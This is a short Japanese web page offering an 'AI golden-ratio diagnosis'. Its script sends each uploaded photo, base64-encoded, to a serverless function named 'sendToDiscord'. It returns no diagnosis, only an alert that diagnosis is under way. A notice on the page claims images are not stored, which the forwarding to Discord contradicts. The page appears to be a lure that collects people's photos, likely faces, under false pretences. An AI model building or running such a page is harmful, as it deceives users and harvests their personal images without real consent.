<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI黄金比診断</title>

<style>
body {
  background: #000;
  color: #fff;
  font-family: sans-serif;
  padding: 20px;
}

input[type="file"] {
  margin-top: 10px;
}

button {
  margin-top: 15px;
  padding: 10px 20px;
  font-size: 16px;
  cursor: pointer;
}

.note {
  font-size: 12px;
  opacity: 0.7;
  margin-top: 10px;
}
</style>
</head>
<body>

<h1>AI黄金比診断</h1>

<input type="file" id="imageInput" accept="image/*">
<br>
<button onclick="sendImage()">診断する</button>

<p class="note">
※アップロードされた画像は診断テスト目的でのみ使用され、保存されません
</p>

<script>
async function sendImage() {
  const fileInput = document.getElementById("imageInput");
  const file = fileInput.files[0];

  if (!file) {
    alert("画像を選んでください");
    return;
  }

  const reader = new FileReader();
  reader.onload = async () => {
    const base64 = reader.result;

    const res = await fetch("/.netlify/functions/sendToDiscord", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: base64 })
    });

    if (res.ok) {
      alert("診断中です！");
    } else {
      alert("エラーが起きました");
    }
  };

  reader.readAsDataURL(file);
}
</script>

</body>
</html>
